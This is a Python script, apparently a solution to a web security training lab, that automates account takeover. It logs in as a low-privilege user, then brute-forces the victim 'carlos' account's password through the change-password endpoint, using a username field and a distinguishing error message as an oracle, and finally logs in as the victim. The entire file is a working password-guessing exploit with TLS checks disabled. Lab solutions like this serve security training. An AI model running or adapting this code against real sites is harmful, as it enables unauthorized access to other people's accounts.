import requests
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, login_url):
    resp = session.get(login_url, verify=False, proxies=proxies)
    match = re.search(r'name="csrf" value="([^"]+)"', resp.text)
    return match.group(1) if match else None

def login(session, url, username="wiener", password="peter"):
    print(f"[*] Logging in as {username}")
    login_url = url + "/login"
    csrf = get_csrf_token(session, login_url)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    resp = session.post(login_url, data=data, verify=False, proxies=proxies, allow_redirects=True)
    if "Log out" in resp.text:
        print("[+] Login successful")
    else:
        print("[-] Login failed - check credentials")
        sys.exit(1)

def bruteforce_password(session, url, wordlist):
    print("[*] Bruteforcing carlos' password...")
    for line in open(wordlist, "r"):
        password = line.rstrip('\r\n')
        change_page = url + "/my-account/change-password"
        data = {"username": "carlos", "current-password": password, "new-password-1": "testabc", "new-password-2": "test123"}
        req = session.post(change_page, data=data, verify=False, proxies=proxies)
        if "New passwords do not match" in req.text:
            print(f"\n[+] Password found: {password}")
            return password
        sys.stdout.write(f"\r[*] Trying: {password:<20}")
        sys.stdout.flush()
    print("\n[-] Password not found")
    return None

def carlos_login(url, password, username="carlos"):
    print("[*] Logging in as carlos")
    session = requests.Session()  
    login_url = url + "/login"
    csrf = get_csrf_token(session, login_url)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    resp = session.post(login_url, data=data, verify=False, proxies=proxies, allow_redirects=True)
    if "Log out" in resp.text:
        print("[+] Successfully logged in. Lab solved")
    else:
        print("[-] Login failed")
        sys.exit(1)

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} <url> <password_list>")
        sys.exit(1)
    url = sys.argv[1].strip().rstrip("/")
    wordlist = sys.argv[2].strip()
    print(f"[+] Target: {url}")

    session = requests.Session()
    login(session, url)
    password = bruteforce_password(session, url, wordlist)
    if password:
        carlos_login(url, password)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()